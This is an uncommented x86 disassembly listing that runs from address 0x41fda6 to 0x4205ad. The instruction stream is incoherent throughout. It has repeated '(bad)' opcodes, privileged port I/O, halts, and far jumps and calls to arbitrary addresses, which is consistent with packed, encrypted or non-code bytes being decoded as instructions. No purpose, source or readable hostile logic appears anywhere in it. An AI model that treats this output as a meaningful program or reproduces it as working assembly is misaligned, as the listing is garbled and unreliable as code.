  41fda6:	mov    edi,0x2e5bd96d
  41fdab:	xchg   ecx,eax
  41fdac:	mov    ebp,0x993e69d0
  41fdb1:	lea    esi,[edx+0x3a0a963f]
  41fdb7:	xchg   edi,ebp
  41fdb9:	es cwde 
  41fdbb:	and    ebp,0x6b
  41fdbe:	add    eax,0xbaec143b
  41fdc3:	das    
  41fdc4:	fld    DWORD PTR [esi]
  41fdc6:	push   edx
  41fdc7:	add    BYTE PTR [edi+0x4a5fe2fe],ch
  41fdcd:	aam    0x26
  41fdcf:	xchg   ecx,esp
  41fdd1:	fiadd  WORD PTR [esi+0x4c]
  41fdd4:	xchg   ebx,eax
  41fdd5:	les    edx,FWORD PTR [eax+0x5a7f5dd0]
  41fddb:	mov    esi,0xc4de5f5b
  41fde0:	int    0x27
  41fde2:	push   ds
  41fde3:	test   DWORD PTR [ebx-0x3ba0cfe4],ebx
  41fde9:	ror    BYTE PTR [edi],1
  41fdeb:	lds    ecx,FWORD PTR [ecx+0x6a6cef10]
  41fdf1:	loopne 0x41fe03
  41fdf3:	sub    BYTE PTR [edx+0x37],dh
  41fdf6:	lods   al,BYTE PTR ds:[esi]
  41fdf7:	ror    BYTE PTR [ebp+0x37],1
  41fdfa:	add    dh,BYTE PTR [ebx+0x45367949]
  41fe00:	push   ebp
  41fe01:	pushf  
  41fe02:	xor    BYTE PTR [edx],al
  41fe04:	ja     0x41fe15
  41fe06:	add    al,0x97
  41fe08:	call   0x75fcae3a
  41fe0d:	inc    edx
  41fe0e:	pop    ebx
  41fe0f:	adc    DWORD PTR [eax+esi*4+0x79],edi
  41fe13:	mov    fs,WORD PTR [ebx-0x376d3336]
  41fe19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe1a:	pop    ecx
  41fe1b:	cmp    eax,DWORD PTR [ebx]
  41fe1d:	bnd jb 0x41fdca
  41fe20:	mov    eax,0x3b35774c
  41fe25:	pusha  
  41fe26:	ret    
  41fe27:	inc    ecx
  41fe28:	and    eax,0x44a9de37
  41fe2d:	hlt    
  41fe2e:	mov    BYTE PTR [ecx-0x444aeaa8],dl
  41fe34:	xor    DWORD PTR [edx+0x119621b7],ebx
  41fe3a:	or     eax,0x95fbfe60
  41fe3f:	xchg   esp,eax
  41fe40:	mov    al,0xd7
  41fe42:	test   ecx,edx
  41fe44:	(bad)  
  41fe45:	sbb    al,0xfd
  41fe47:	pop    esi
  41fe48:	rcr    esp,1
  41fe4a:	(bad)  
  41fe4b:	in     eax,0x4e
  41fe4d:	xchg   eax,edi
  41fe4f:	in     eax,0x59
  41fe51:	sub    cl,BYTE PTR [ebx]
  41fe53:	sbb    esi,DWORD PTR [esi+0x3d0e5f8d]
  41fe59:	imul   BYTE PTR [ebp+0x1d97aa92]
  41fe5f:	rol    DWORD PTR [ebx-0x140581c8],cl
  41fe65:	popa   
  41fe66:	mov    ebx,0x753da049
  41fe6b:	fdiv   QWORD PTR [eax-0x4d9693fe]
  41fe71:	lahf   
  41fe72:	enter  0x2fd0,0xcd
  41fe76:	or     eax,0xa0387044
  41fe7b:	mov    al,0x7c
  41fe7d:	ret    
  41fe7e:	mov    cl,BYTE PTR [eax]
  41fe80:	jo     0x41fe1b
  41fe82:	dec    ecx
  41fe83:	hlt    
  41fe84:	fst    st(3)
  41fe86:	pusha  
  41fe87:	loop   0x41fe35
  41fe89:	push   esi
  41fe8a:	sub    al,0x8c
  41fe8c:	int3   
  41fe8d:	xor    ebp,DWORD PTR [eax+0x3d]
  41fe90:	xor    dh,bl
  41fe92:	xor    ebx,ebp
  41fe94:	cmp    DWORD PTR [ecx+0x55e8fc1e],ebp
  41fe9a:	arpl   WORD PTR [ebp+ebx*8-0x79],sp
  41fe9e:	mov    ch,0x1d
  41fea0:	xchg   edx,eax
  41fea1:	shr    BYTE PTR [edx-0x3a19c9d9],1
  41fea7:	or     BYTE PTR [eax],al
  41fea9:	repz idiv BYTE PTR [edx+ebp*8+0x18]
  41feae:	sbb    eax,0x99252650
  41feb3:	aam    0x50
  41feb5:	hlt    
  41feb6:	xchg   ebx,eax
  41feb7:	jl     0x41feff
  41feb9:	(bad)  
  41feba:	nop
  41febb:	xchg   ebx,eax
  41febc:	push   ss
  41febd:	icebp  
  41febe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41febf:	xchg   esp,eax
  41fec0:	inc    esi
  41fec1:	cli    
  41fec2:	mov    al,BYTE PTR [esi-0x75]
  41fec5:	rol    DWORD PTR [edx],0x9f
  41fec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fec9:	push   edi
  41feca:	aad    0x79
  41fecc:	mov    esi,DWORD PTR [eax-0x12]
  41fecf:	jns    0x41ff3a
  41fed1:	jg     0x41ff0b
  41fed3:	repz fistp WORD PTR [ecx]
  41fed6:	jno    0x41feb2
  41fed8:	fist   WORD PTR [eax]
  41feda:	loope  0x41ff51
  41fedc:	or     ecx,DWORD PTR [ecx-0xa]
  41fedf:	rol    DWORD PTR [edx-0x4a6ead49],0xa
  41fee6:	add    eax,0xe24f0963
  41feeb:	fidivr DWORD PTR [ebp+0x78b1705e]
  41fef1:	jne    0x41feea
  41fef3:	and    al,BYTE PTR fs:[esi+0x69da923d]
  41fefa:	pop    eax
  41fefb:	jae    0x41ff1c
  41fefd:	sub    eax,0xf147f28e
  41ff02:	stc    
  41ff03:	mov    dl,0x63
  41ff05:	sbb    DWORD PTR [ebx+0x1fa0491e],0x2cf1ff51
  41ff0f:	add    edi,DWORD PTR [edx+0x3d00af86]
  41ff15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff16:	fisttp WORD PTR [edx+edx*4+0x54f979bd]
  41ff1d:	out    dx,al
  41ff1e:	adc    cl,dl
  41ff20:	sti    
  41ff21:	dec    eax
  41ff22:	(bad)  
  41ff23:	in     eax,0xb0
  41ff25:	rol    BYTE PTR [ebx+0x75],1
  41ff28:	sti    
  41ff29:	adc    DWORD PTR [edi],0x1
  41ff2c:	imul   ebx,DWORD PTR [esp+ecx*1-0x6a87828],0xfffffff8
  41ff34:	ds jmp 0xb5d45d4f
  41ff3a:	retf   0x1a8
  41ff3d:	pop    es
  41ff3e:	jae    0x41fedc
  41ff40:	sbb    esp,eax
  41ff42:	(bad)  
  41ff43:	or     al,0x9f
  41ff45:	cwde   
  41ff46:	push   esi
  41ff47:	ret    
  41ff48:	test   BYTE PTR [eax-0x38],dh
  41ff4b:	sar    eax,1
  41ff4d:	mov    dl,0x4f
  41ff4f:	add    bl,dl
  41ff51:	stos   DWORD PTR es:[edi],eax
  41ff52:	into   
  41ff53:	push   0xffffffb0
  41ff55:	test   al,0x2d
  41ff57:	jmp    0x328868be
  41ff5c:	aam    0x14
  41ff5e:	mov    cl,0x39
  41ff60:	pop    ds
  41ff61:	dec    DWORD PTR [esi+0x721b18d1]
  41ff67:	adc    BYTE PTR [edx],al
  41ff69:	loop   0x41ff4c
  41ff6b:	sbb    eax,0xab981327
  41ff70:	mov    eax,0xb2c9e929
  41ff75:	add    BYTE PTR [eax],al
  41ff77:	in     eax,0x3d
  41ff79:	mov    dl,0xea
  41ff7b:	cmp    ah,ch
  41ff7d:	jnp    0x41fffb
  41ff7f:	(bad)  
  41ff80:	std    
  41ff81:	cld    
  41ff82:	add    DWORD PTR [esi],eax
  41ff84:	cwde   
  41ff85:	inc    ebx
  41ff86:	sbb    bh,BYTE PTR [edi-0x1]
  41ff89:	add    BYTE PTR [ebp+0x72],al
  41ff8c:	ss pusha 
  41ff8e:	stos   DWORD PTR es:[edi],eax
  41ff8f:	aaa    
  41ff90:	push   ss
  41ff91:	jns    0x41ff7c
  41ff93:	and    bh,0x98
  41ff96:	sub    BYTE PTR [ebp+0x6649a6dd],dh
  41ff9c:	jne    0x41ff9d
  41ff9e:	pop    esp
  41ff9f:	lea    eax,[ecx]
  41ffa1:	test   al,0xbf
  41ffa3:	dec    esi
  41ffa4:	pop    ss
  41ffa5:	ja     0x41ffaa
  41ffa7:	in     eax,dx
  41ffa8:	mov    ah,0x0
  41ffaa:	xchg   edx,eax
  41ffab:	pop    edi
  41ffac:	in     al,dx
  41ffad:	in     al,0xb1
  41ffaf:	adc    eax,0xe58f82d5
  41ffb4:	out    dx,eax
  41ffb5:	mov    edx,0x14f26a32
  41ffba:	cmp    ch,ch
  41ffbc:	xor    eax,0x8142e52d
  41ffc1:	xor    al,0xa1
  41ffc3:	imul   edi,DWORD PTR [ebp+0x5f],0x32
  41ffc7:	int3   
  41ffc8:	and    eax,ebx
  41ffca:	inc    BYTE PTR [edi-0x2c]
  41ffcd:	xor    eax,0xa5660c1
  41ffd2:	in     eax,dx
  41ffd3:	pop    ecx
  41ffd4:	jmp    DWORD PTR [edi+ebx*1-0x12]
  41ffd8:	mov    ah,0x12
  41ffda:	and    al,0x9
  41ffdc:	aas    
  41ffdd:	cmp    al,0x35
  41ffdf:	ins    DWORD PTR es:[edi],dx
  41ffe0:	push   edi
  41ffe1:	mov    al,0xe3
  41ffe3:	and    bh,BYTE PTR [esi-0xd]
  41ffe6:	jg     0x42003b
  41ffe8:	(bad)  
  41ffea:	lahf   
  41ffeb:	lods   al,BYTE PTR ds:[esi]
  41ffec:	nop
  41ffed:	mov    ds:0x9221d850,al
  41fff2:	aam    0x51
  41fff4:	mov    esi,0x91053f2a
  41fff9:	pop    ss
  41fffa:	dec    edi
  41fffb:	shl    esp,0x65
  41fffe:	push   ds
  41ffff:	adc    al,0x43
  420001:	out    0x60,al
  420003:	imul   eax,ebx,0xc5425fd0
  420009:	fld    TBYTE PTR [ebp-0x6a]
  42000c:	and    DWORD PTR [esp+ebx*8+0x62f559fa],esp
  420013:	mov    cl,0xfb
  420015:	mov    ecx,0xe91a337a
  42001a:	or     eax,0x7315644c
  42001f:	fisttp QWORD PTR [esi+0xa]
  420022:	xor    BYTE PTR [eax-0x66515278],ch
  420028:	jmp    0xf6e4:0x5f805a65
  42002f:	shl    edx,0xf9
  420032:	add    DWORD PTR [ebp+ebp*8-0x14eca6bb],esp
  420039:	adc    eax,0x825bc9c8
  42003e:	xor    eax,0x68088ce9
  420043:	pop    ebp
  420044:	cmp    BYTE PTR [edi+0x16],dl
  420047:	inc    edx
  420048:	mov    WORD PTR [edi],es
  42004a:	in     al,0x6
  42004c:	or     DWORD PTR [edi-0x74],ebp
  42004f:	mov    al,ds:0xfffa967f
  420054:	sub    ebx,0xb4d5e3e
  42005a:	cmp    al,0x52
  42005c:	or     BYTE PTR [ecx+0x444e5293],bl
  420062:	xor    eax,0x76c9609e
  420067:	fadd   DWORD PTR [ebx]
  420069:	imul   eax,edi,0xffffffe5
  42006c:	repnz fdivr DWORD PTR [ebx]
  42006f:	ss xchg ecx,eax
  420071:	dec    ebx
  420072:	push   edi
  420073:	jl     0x420027
  420075:	retf   0x8b6a
  420078:	push   eax
  420079:	xchg   bp,ax
  42007b:	(bad)  
  42007c:	retf   
  42007d:	and    BYTE PTR [eax],al
  42007f:	sub    ecx,esi
  420081:	dec    eax
  420082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420083:	xor    al,0xc1
  420085:	jmp    0x52d8:0xc1292550
  42008c:	adc    eax,0xef866d39
  420091:	jmp    0x4200da
  420093:	xor    eax,0xfe28a7a7
  420098:	ins    DWORD PTR es:[edi],dx
  420099:	pusha  
  42009a:	pop    edx
  42009b:	pop    ebp
  42009c:	shr    DWORD PTR [ebx],1
  42009e:	add    DWORD PTR [ecx],0xf98d598e
  4200a4:	mov    WORD PTR fs:[ebx],?
  4200a7:	pop    DWORD PTR [ebx]
  4200a9:	popa   
  4200aa:	cmp    eax,0x455820e0
  4200af:	jo     0x420040
  4200b1:	xchg   ah,al
  4200b3:	pop    ds
  4200b4:	push   eax
  4200b5:	mov    edx,0xf79cef69
  4200ba:	mov    edx,0x59c56483
  4200bf:	out    dx,eax
  4200c0:	sbb    bl,cl
  4200c2:	(bad)
  4200c5:	mov    ah,0xe1
  4200c7:	stos   BYTE PTR es:[edi],al
  4200c8:	popa   
  4200c9:	test   al,0x92
  4200cb:	and    al,0xbb
  4200cd:	inc    esp
  4200ce:	stos   BYTE PTR es:[edi],al
  4200cf:	(bad)  
  4200d0:	aaa    
  4200d1:	mov    cs,WORD PTR [edx+0x0]
  4200d4:	lahf   
  4200d5:	imul   eax,DWORD PTR [ebx],0xffffffd3
  4200d8:	ins    DWORD PTR es:[edi],dx
  4200d9:	dec    ebp
  4200da:	test   eax,0x6fcff699
  4200df:	jge    0x420147
  4200e1:	push   cs
  4200e2:	and    BYTE PTR [edx-0x63],dh
  4200e5:	shl    DWORD PTR [edx-0x3c],1
  4200e8:	or     esp,DWORD PTR [ebx+0x52c6d36d]
  4200ee:	shl    BYTE PTR [eax+eiz*2+0x37],0xd3
  4200f3:	or     DWORD PTR [edx+ebp*2],0xffffffed
  4200f7:	shr    BYTE PTR [esi],0x1a
  4200fa:	scas   eax,DWORD PTR es:[edi]
  4200fb:	mov    ch,0x8
  4200fd:	retf   
  4200fe:	push   es
  4200ff:	pop    edx
  420100:	add    ah,bh
  420102:	jecxz  0x420110
  420104:	or     al,ah
  420106:	sub    eax,0x987199a3
  42010b:	(bad)  
  42010c:	jmp    0x621d448f
  420111:	nop
  420112:	mov    eax,ds:0xf74b2e2b
  420117:	int    0xc
  420119:	cmp    ebx,DWORD PTR [ebx]
  42011b:	adc    DWORD PTR [esi-0x13],edx
  42011e:	and    bl,BYTE PTR [ebx]
  420120:	mov    ecx,0x68adc7de
  420125:	cmp    al,0x15
  420127:	jae    0x4200ec
  420129:	les    ebp,FWORD PTR [eax-0x55]
  42012c:	xchg   DWORD PTR [esi+eax*4],eax
  42012f:	pop    ecx
  420130:	mov    dh,0x89
  420132:	sbb    eax,0xfc53061a
  420137:	mov    DWORD PTR [ebp-0xe],0x1525cdb6
  42013e:	jbe    0x42011b
  420140:	jl     0x420153
  420142:	scas   eax,DWORD PTR es:[edi]
  420143:	pop    es
  420144:	call   0xe890:0xaf163e95
  42014b:	call   0xd9c0:0xf77ffea0
  420152:	sar    BYTE PTR [esi+0xb584b0c],cl
  420158:	inc    ebp
  420159:	frstor [ebp-0x7232474f]
  42015f:	or     al,0xc5
  420161:	mov    edx,0x8a66676a
  420166:	cmp    bh,BYTE PTR ds:0x85e6429a
  42016c:	out    dx,al
  42016d:	jmp    0xa685:0x246e4850
  420174:	mov    ebp,0x958c18a6
  420179:	inc    eax
  42017a:	iret   
  42017b:	(bad)  
  42017c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42017d:	test   BYTE PTR [edi-0x44],al
  420180:	das    
  420181:	lods   eax,DWORD PTR ds:[esi]
  420182:	dec    ecx
  420183:	jmp    0x42012e
  420185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420186:	mov    edx,0x23772c55
  42018b:	ret    0x4d1a
  42018e:	mov    bh,0x60
  420190:	jmp    0x5cf40257
  420195:	or     DWORD PTR [edx+0x6aedf401],ebp
  42019b:	cld    
  42019c:	fcomp  DWORD PTR [edi-0x27]
  42019f:	test   al,0x3
  4201a1:	fnsave [ebp+0x66d85a75]
  4201a7:	sbb    eax,0x8bf8f5c3
  4201ac:	rol    BYTE PTR [edx+0x2addb150],1
  4201b2:	stos   DWORD PTR es:[edi],eax
  4201b3:	fs add ebp,ebx
  4201b6:	mov    al,BYTE PTR [eax+0x40]
  4201b9:	aad    0x44
  4201bb:	lahf   
  4201bc:	retf   0x50ca
  4201bf:	lods   eax,DWORD PTR ds:[esi]
  4201c0:	and    esp,DWORD PTR [edx]
  4201c2:	cwde   
  4201c3:	dec    edx
  4201c4:	sub    ebp,edi
  4201c6:	pop    ebx
  4201c7:	jnp    0x42021f
  4201c9:	cmp    ah,dh
  4201cb:	xor    esi,ebp
  4201cd:	mov    eax,DWORD PTR [edi*4+0x55d04be8]
  4201d4:	test   DWORD PTR [edx+ebx*2-0x5c540206],edi
  4201db:	sar    DWORD PTR [edi],1
  4201dd:	dec    ebp
  4201de:	popf   
  4201df:	scas   eax,DWORD PTR es:[edi]
  4201e0:	inc    ebp
  4201e1:	(bad)  
  4201e2:	fwait
  4201e3:	(bad)  
  4201e4:	into   
  4201e5:	mov    DWORD PTR [ecx+0x62],ecx
  4201e8:	mov    esp,0x4178531e
  4201ed:	inc    ecx
  4201ee:	fiadd  WORD PTR [ecx-0x64d656ed]
  4201f4:	adc    edi,DWORD PTR [esi]
  4201f6:	mov    esi,0x1af8e43c
  4201fb:	and    eax,0xee868b7
  420200:	add    bl,bl
  420202:	aaa    
  420203:	pop    edx
  420204:	pop    ds
  420205:	adc    BYTE PTR [ebx],0xef
  420208:	sub    eax,0x3d9ccaf2
  42020d:	cld    
  42020e:	and    DWORD PTR [edx-0x1f],eax
  420211:	dec    esi
  420212:	retf   
  420213:	out    0xc,eax
  420215:	jecxz  0x420283
  420217:	enter  0xc87,0x86
  42021b:	lahf   
  42021c:	ins    BYTE PTR es:[edi],dx
  42021d:	es cdq 
  42021f:	adc    BYTE PTR [edx],bh
  420221:	jbe    0x4202a2
  420223:	push   eax
  420224:	repz (bad) 
  420226:	aas    
  420227:	ret    
  420228:	mov    eax,0x325e38d3
  42022d:	xor    DWORD PTR [ecx],edx
  42022f:	or     eax,edx
  420231:	jge    0x420217
  420233:	jecxz  0x420263
  420235:	or     BYTE PTR [esi-0x738b1a46],bl
  42023b:	push   edi
  42023c:	mov    edx,0x4599e888
  420241:	jmp    FWORD PTR [ebx+0x5]
  420244:	(bad)  
  420245:	adc    ch,BYTE PTR [eax-0x6852d675]
  42024b:	imul   edx,DWORD PTR [ebx+0x78450b0b],0xffffffe5
  420252:	icebp  
  420253:	ds mov dh,0x3b
  420256:	jge    0x420275
  420258:	cmp    DWORD PTR [edx+0x1772e2f4],ecx
  42025e:	shr    BYTE PTR [ecx-0x3f4f09e3],cl
  420264:	pushf  
  420265:	scas   eax,DWORD PTR es:[edi]
  420266:	ret    
  420267:	push   edi
  420268:	shr    DWORD PTR [edi-0x44],0x43
  42026c:	fidivr DWORD PTR [ebp+0x48ae2fec]
  420272:	pop    edx
  420273:	and    ecx,eax
  420275:	xchg   esp,eax
  420276:	clc    
  420277:	retf   
  420278:	mov    ds,ebp
  42027a:	rol    BYTE PTR [ebp-0xe],0xfe
  42027e:	loope  0x420223
  420280:	xor    ebp,esi
  420282:	ret    0xf6a5
  420285:	xlat   BYTE PTR ds:[ebx]
  420286:	leave  
  420287:	ficomp WORD PTR [esi-0x62a2eba8]
  42028d:	lahf   
  42028e:	push   ecx
  42028f:	lea    edx,[esi]
  420291:	call   0x12275c0f
  420296:	mov    dl,0xd7
  420298:	dec    esp
  420299:	jne    0x420276
  42029b:	push   esi
  42029c:	inc    edx
  42029d:	push   0xffffffc8
  42029f:	rcr    DWORD PTR ds:0x67326a97,cl
  4202a5:	cmp    bh,BYTE PTR [edi+0x58]
  4202a8:	pusha  
  4202a9:	inc    ebx
  4202aa:	ins    BYTE PTR es:[edi],dx
  4202ab:	mov    bh,0x11
  4202ad:	dec    esi
  4202ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202af:	mov    ebp,DWORD PTR [esi-0x15]
  4202b2:	popf   
  4202b3:	or     ebx,DWORD PTR [edx+eax*8+0x30e73215]
  4202ba:	pop    eax
  4202bb:	and    eax,0xd6c01429
  4202c0:	inc    ecx
  4202c1:	(bad)
  4202c4:	loope  0x420311
  4202c6:	outs   dx,DWORD PTR ds:[esi]
  4202c7:	sar    DWORD PTR [eax-0x34c7fbe5],1
  4202cd:	push   gs
  4202cf:	pminub mm3,mm5
  4202d2:	jnp    0x420291
  4202d4:	jnp    0x42029b
  4202d6:	fst    DWORD PTR [eax+0xb]
  4202d9:	mov    al,0xb7
  4202db:	sub    edx,DWORD PTR [edi-0x50cb6367]
  4202e1:	adc    BYTE PTR [edi+0x4d99f3db],bl
  4202e7:	xor    eax,0x5c2b21d4
  4202ec:	loop   0x420307
  4202ee:	sub    al,0x9e
  4202f0:	nop
  4202f1:	push   ebp
  4202f2:	not    BYTE PTR [edx-0x67]
  4202f5:	int3   
  4202f6:	adc    DWORD PTR [eax],0x1e
  4202f9:	sub    cl,bl
  4202fb:	dec    ebx
  4202fc:	xor    eax,0xee5e45d3
  420301:	(bad)  
  420302:	or     eax,DWORD PTR [esi+0x428f8549]
  420308:	sbb    eax,0x7d0ee75e
  42030d:	stos   DWORD PTR es:[edi],eax
  42030e:	ret    0x396b
  420311:	adc    BYTE PTR [edx-0x57],cl
  420314:	loopne 0x420303
  420316:	nop
  420317:	and    DWORD PTR [esi-0x37],ebp
  42031a:	out    0x5e,al
  42031c:	xchg   ch,cl
  42031e:	and    BYTE PTR [ebx-0x61f7321b],bh
  420324:	jno    0x420397
  420326:	pop    ebp
  420327:	pop    edx
  420328:	mov    al,0x44
  42032a:	xchg   BYTE PTR ss:[edx+ecx*4-0x17e15744],cl
  420332:	ret    
  420333:	fwait
  420334:	xchg   ebx,eax
  420335:	inc    esi
  420336:	sub    DWORD PTR [ebp+0x40f5277c],0xeed796fb
  420340:	lahf   
  420341:	cmp    DWORD PTR [edi-0x59],eax
  420344:	icebp  
  420345:	cmp    eax,0xbb5ffa07
  42034a:	or     eax,0x8c76ed
  42034f:	test   eax,0x56e2e01a
  420354:	and    dl,BYTE PTR [edi-0x4c]
  420357:	stos   DWORD PTR es:[edi],eax
  420358:	inc    eax
  420359:	ret    0xaa8
  42035c:	cld    
  42035d:	int    0xe2
  42035f:	dec    ecx
  420360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420361:	mov    esp,0x7d6ee987
  420366:	pop    ebx
  420367:	inc    ebp
  420368:	fdiv   QWORD PTR [edi+0x179b3bbd]
  42036e:	test   al,0xbd
  420370:	adc    BYTE PTR [edx+0x32],dh
  420373:	cmovns esi,DWORD PTR [esi+eiz*8+0x2c01a9bc]
  42037b:	ret    0xccb6
  42037e:	pop    ebx
  42037f:	xchg   BYTE PTR [edi+0x5b95cb53],al
  420385:	jecxz  0x420337
  420387:	pop    es
  420388:	ret    
  420389:	fs push es
  42038b:	aad    0x6b
  42038d:	xchg   esp,eax
  42038e:	hlt    
  42038f:	or     eax,0xeaaef09a
  420394:	and    eax,0xc00e2c82
  420399:	les    edi,FWORD PTR [ebx+0x10]
  42039c:	and    DWORD PTR [ecx-0x24],esi
  42039f:	leave  
  4203a0:	pop    ss
  4203a1:	ss pop ecx
  4203a3:	mov    al,ds:0xd46e0d2c
  4203a8:	test   DWORD PTR [ebp+0x3f9aa31a],eax
  4203ae:	mov    eax,ds:0x557c7d85
  4203b3:	push   edx
  4203b4:	sbb    bh,BYTE PTR [esi]
  4203b6:	mov    eax,DWORD PTR [ecx-0x6cf5c300]
  4203bc:	sbb    DWORD PTR [edi-0x58],ecx
  4203bf:	ins    BYTE PTR es:[edi],dx
  4203c0:	ret    0x4fcc
  4203c3:	lea    ebp,[ecx-0x141681f4]
  4203c9:	dec    DWORD PTR [eax+0x392e61f1]
  4203cf:	scas   eax,DWORD PTR es:[edi]
  4203d0:	mov    ch,0xf8
  4203d2:	fs xchg edx,eax
  4203d4:	xor    al,0x1b
  4203d6:	outs   dx,DWORD PTR ds:[esi]
  4203d7:	mov    al,0xfa
  4203d9:	daa    
  4203da:	in     eax,0x6f
  4203dc:	inc    esi
  4203dd:	push   eax
  4203de:	inc    ecx
  4203df:	xchg   DWORD PTR [ecx-0x43],edx
  4203e2:	ja     0x4203d4
  4203e4:	mov    eax,0x6e00b541
  4203e9:	mov    ecx,0x250b50e6
  4203ee:	push   0x9a900ffd
  4203f3:	mov    eax,0x55938fce
  4203f8:	jmp    0x4203e9
  4203fa:	fild   WORD PTR [eax-0x39b4dc16]
  420400:	or     al,0x8a
  420402:	jb     0x420446
  420404:	mov    eax,ds:0x2a2cfeb9
  420409:	or     ch,bh
  42040b:	mov    al,ds:0xfb38c223
  420410:	ficom  WORD PTR ds:0x83173458
  420416:	or     esi,DWORD PTR [ebp+0x3e]
  420419:	jno    0x420488
  42041b:	sub    bl,bh
  42041d:	mov    ds:0x533e0146,al
  420422:	mov    edi,0x75d22311
  420427:	mov    WORD PTR [eax-0x15],gs
  42042a:	enter  0xa4b8,0x32
  42042e:	fcomip st,st(1)
  420430:	fnstenv [eax+0x1a]
  420433:	pop    esi
  420434:	push   edx
  420435:	add    DWORD PTR [esi-0x28],ebx
  420438:	pop    edx
  420439:	mov    edx,0xf31a59be
  42043e:	mov    cl,0x81
  420440:	pop    esp
  420441:	cs dec esp
  420443:	inc    edi
  420444:	cwde   
  420445:	(bad)  
  420446:	stc    
  420447:	ret    0x7bbe
  42044a:	xor    dl,bl
  42044c:	stos   BYTE PTR es:[edi],al
  42044d:	mov    ds:0xa52ea4e3,al
  420452:	jne    0x42046b
  420454:	loopne 0x420416
  420456:	lock jne 0x420481
  420459:	sbb    DWORD PTR [esi+0x20184ebd],esp
  42045f:	test   al,0x4f
  420461:	mov    al,0xa
  420463:	sbb    eax,0x5329781e
  420468:	add    bl,ah
  42046a:	das    
  42046b:	aam    0xd
  42046d:	fld    st(3)
  42046f:	addr16 jge 0x420465
  420472:	nop
  420473:	loopne 0x420491
  420475:	ins    DWORD PTR es:[edi],dx
  420476:	shl    BYTE PTR [edx-0x7ca04c38],cl
  42047c:	repnz shl DWORD PTR [edx-0x17e2d0e1],0xcc
  420484:	xchg   BYTE PTR [edx],cl
  420486:	or     al,0x63
  420488:	sbb    dh,BYTE PTR [eax]
  42048a:	and    eax,0xa7e5394b
  42048f:	mov    ecx,0x8ec54dd3
  420494:	rol    cl,0xa8
  420497:	add    bh,BYTE PTR [edi]
  420499:	pop    ebx
  42049a:	cmp    BYTE PTR [edx-0x64070a4a],bl
  4204a0:	mov    dh,0xda
  4204a2:	push   esi
  4204a3:	ret    
  4204a4:	mov    BYTE PTR [ebp+0x70],bl
  4204a7:	inc    esi
  4204a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204a9:	jns    0x420431
  4204ab:	imul   esi,DWORD PTR [edi],0xffffffea
  4204ae:	adc    edx,esi
  4204b0:	je     0x420491
  4204b2:	popf   
  4204b3:	sbb    ah,cl
  4204b5:	in     eax,0x37
  4204b7:	cwde   
  4204b8:	out    dx,al
  4204b9:	cld    
  4204ba:	sbb    ecx,DWORD PTR [edi+0x1d]
  4204bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204be:	mov    ebp,0xd7647305
  4204c3:	or     dh,BYTE PTR [ebx]
  4204c5:	(bad)  
  4204c6:	in     al,dx
  4204c7:	cli    
  4204c8:	clc    
  4204c9:	frstor [edi]
  4204cb:	fs std 
  4204cd:	into   
  4204ce:	retf   0xfa3e
  4204d1:	adc    bl,dh
  4204d3:	cmp    dl,BYTE PTR [edi+ebx*8+0x6b]
  4204d7:	inc    ecx
  4204d8:	test   al,0x10
  4204da:	call   0x1f2286a9
  4204df:	sub    ecx,esp
  4204e1:	xchg   cl,dh
  4204e3:	and    al,0xf7
  4204e5:	adc    al,0xff
  4204e7:	int    0x83
  4204e9:	mov    bh,0x6d
  4204eb:	clc    
  4204ec:	sub    eax,0xaec2feca
  4204f1:	mov    al,0x26
  4204f3:	ins    DWORD PTR es:[edi],dx
  4204f4:	es push ebp
  4204f6:	test   BYTE PTR [edx-0x3d92e7c7],al
  4204fc:	call   0x6c34:0x8fb8d7e6
  420503:	push   ss
  420504:	leave  
  420505:	pusha  
  420506:	add    eax,0x83b13518
  42050b:	xor    DWORD PTR [ebx+0x77],edx
  42050e:	adc    BYTE PTR [edi+ebx*1-0x3e],bh
  420512:	loop   0x4204e8
  420514:	out    dx,eax
  420515:	sub    dh,BYTE PTR [edx+eax*1]
  420518:	into   
  420519:	test   al,0xdc
  42051b:	push   edi
  42051c:	add    ecx,DWORD PTR [ecx]
  42051e:	sbb    edx,DWORD PTR [ebp-0x19e354d7]
  420524:	inc    edi
  420525:	and    ah,cl
  420527:	sub    DWORD PTR [eax-0x5b552899],edi
  42052d:	test   BYTE PTR [esi+0x5a],cl
  420530:	cmp    BYTE PTR [ebp+0x10],dl
  420533:	adc    al,0x93
  420535:	add    ebx,ecx
  420537:	dec    edx
  420538:	xor    BYTE PTR [edi],bl
  42053a:	push   esi
  42053b:	jle    0x4205af
  42053d:	sub    eax,0x88ca4bfe
  420542:	mov    ebp,0x7c586f1c
  420547:	pop    es
  420548:	or     eax,0xab54c41b
  42054d:	jecxz  0x4205c5
  42054f:	or     al,0x2e
  420551:	fcmovnu st,st(2)
  420553:	and    WORD PTR [ebx-0x4a5ffeca],cx
  42055a:	add    eax,0x8c2d133c
  42055f:	mov    ds:0x35c099bb,al
  420564:	pop    ecx
  420565:	pop    esi
  420566:	add    bl,BYTE PTR [ebx+esi*4+0x7588b061]
  42056d:	popf   
  42056e:	test   al,0xe6
  420570:	push   edi
  420571:	dec    edx
  420572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420573:	pop    esi
  420574:	sti    
  420575:	sub    ecx,DWORD PTR ds:0x23878045
  42057b:	je     0x42053e
  42057d:	out    0xc6,eax
  42057f:	adc    BYTE PTR [bx],cl
  420582:	daa    
  420583:	nop/reserved BYTE PTR [eax]
  420586:	pop    DWORD PTR [ebp+0x74c245f5]
  42058c:	loop   0x420539
  42058e:	fucom  st(3)
  420590:	mov    eax,0xd9528b10
  420595:	mov    ah,0xd5
  420597:	call   0x9388:0x1cdb035a
  42059e:	adc    al,0x9b
  4205a0:	and    al,0x4f
  4205a2:	shl    BYTE PTR [eax+eax*2],cl
  4205a5:	popa   
  4205a6:	sub    eax,0x6655580e
  4205ab:	and    al,0x54
  4205ad:	in     al,0xca
